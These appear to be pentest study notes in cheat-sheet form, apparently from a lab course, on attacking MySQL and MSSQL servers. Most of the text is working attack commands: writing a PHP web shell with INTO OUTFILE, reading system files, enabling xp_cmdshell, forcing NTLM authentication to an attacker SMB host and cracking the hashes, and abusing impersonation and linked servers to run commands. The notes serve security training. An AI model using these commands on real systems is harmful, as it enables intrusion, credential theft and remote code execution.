---
title: "Attacking Common Services — SQL"
tags: [attacking-common-services, mssql, mysql, sql, enumeration, impersonation]
tools: [sqlcmd, mssqlclient, mssql-cli, sqsh, mysql, impacket, responder, hashcat]
---

# SQL

## Quick Connect Examples
```bash
# MySQL
mysql -u julio -p'Password123' -h 10.129.20.13

# MSSQL from Windows
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!'

# FreeTDS / sqsh (Linux)
sqsh -S 10.129.203.7 -U juli0 -P 'MyPassword!'

# Impacket mssqlclient
mssqlclient.py julio@10.129.203.7 -p 1433
```

---

## Common Enumeration Queries
```sql
# MySQL
SHOW DATABASES;
USE htbusers;
SHOW TABLES;
SELECT * FROM users;

# MSSQL
-- List databases (MSSQL)
SELECT name FROM master.dbo.sysdatabases;
-- Or
SELECT database_id, name FROM sys.databases;

-- Show tables in current DB
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';

-- Dump table
SELECT * FROM dbo.users; -- watch out for large tables
```

Notes: always set a row limit when exploring unknown tables (TOP N or LIMIT) to avoid huge outputs.

---

## Read Local Files
```sql
-- MySQL: requires secure_file_priv to allow OUTFILE or LOAD_FILE
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php echo shell_exec($_GET["c"]);?>' INTO OUTFILE '/var/www/html/webshell.php';

-- MSSQL using OPENROWSET for file read (if enabled)
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```
Notes: READ access to filesystem depends on DB service account privileges and server configuration.

---

## Command Execution
```sql
# MySQL
show variables like "secure_file_priv"; # Check if empty
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

# MSSQL
-- Basic xp_cmdshell usage (if enabled)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
Caveat: enabling xp_cmdshell requires appropriate permission and is noisy — check logs and use only when permitted by scope.

---

## Capture Service Authentication (NTLM hashes)
- Use `xp_dirtree` / `xp_subdirs` to force MSSQL to authenticate to your SMB server and capture NetNTLM challenge/response.

Start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket)

```bash
sudo responder -I tun0

sudo impacket-smbserver share ./ -smb2support

# Crack it
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```mssql
# XP_DIRTREE Hash Stealing
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

#XP_SUBDIRS Hash Stealing
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

Run `Responder` or `impacket-smbserver` to collect the hashes, then crack with `hashcat -m 5600`.

---

## Impersonation & Privilege Escalation (MSSQL)
- Check who can be impersonated:
```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```
- Impersonate a login (if allowed):
```sql
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- verify
REVERT; -- drop impersonation
```
- If linked servers exist, you can execute commands on the linked instance using `EXECUTE('...') AT [linked.server]` and enable `xp_cmdshell` there to run system commands remotely.

Example flow used in boxes:
```sql
-- Find linked servers
SELECT srvname, isremote FROM sysservers; -- isremote 1 = remote

-- Run a remote command via linked server
EXECUTE AS LOGIN = 'john';
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
EXECUTE('xp_cmdshell ''type C:\\Users\\Administrator\\Desktop\\flag.txt''') AT [LOCAL.TEST.LINKED.SRV];
REVERT;
```

### Example - Impersonation

```sql
# Get users
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO

# Find remote server
SELECT srvname, isremote FROM sysservers
GO

# Impersonat
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO

# allow xp_cmdshell
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]

# Grab flag
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
```

---

## Practical Pentest Tips
- Always enumerate server-level permissions and linked servers early — they often lead to escalation paths.
- Use `TOP 100` / `LIMIT` when querying unknown tables.
- Be cautious with `OUTFILE` and `xp_cmdshell`; they are effective but noisy.
- If `xp_cmdshell` is not available, look for CLR assemblies, SQL Agent jobs, or backup file locations to pivot.
- Capture any DB service account context (e.g., NT SERVICE\MSSQLSERVER) and understand filesystem permissions associated with that account.

---

## Offensive Checklist
- [ ] Enumerate databases and tables (limit rows)
- [ ] Search for credential tables, config files, backup paths
- [ ] Attempt file reads (OPENROWSET / LOAD_FILE)
- [ ] Force authentication to attacker SMB to capture NetNTLM
- [ ] Look for IMPERSONATE permissions and linked servers
- [ ] Pivot to linked servers and attempt xp_cmdshell / file reads

---

## Vulnerabilities / Notes
- Common misconfigurations: enabled xp_cmdshell, writable webroot via OUTFILE, excessive IMPERSONATE grants, open linked servers.
- Defensive note: DB servers with high privileges and linked servers should be monitored for sp_configure and xp_cmdshell usage.
